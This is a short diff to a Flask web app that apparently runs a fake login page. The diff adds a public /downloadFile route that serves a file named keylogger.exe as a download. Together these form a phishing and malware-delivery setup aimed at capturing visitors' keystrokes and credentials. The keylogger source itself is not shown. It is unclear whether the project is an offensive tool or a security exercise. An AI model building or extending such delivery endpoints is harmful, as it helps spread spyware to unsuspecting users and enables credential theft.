@@ -1,4 +1,4 @@
-from flask import render_template, request, redirect
+from flask import render_template, request, redirect, send_file
 from flask_login import login_required, login_user, logout_user, current_user
 from LoginSystems.GoodLoginSystem import app, databaseManager, requestManager
 
@@ -96,3 +96,7 @@ def fakeLoginPage():
 @app.route('/error')
 def error():
     return render_template("error.html")
+
+@app.route('/downloadFile')
+def downloadFile():
+    return send_file("../keylogger.exe", as_attachment=True)
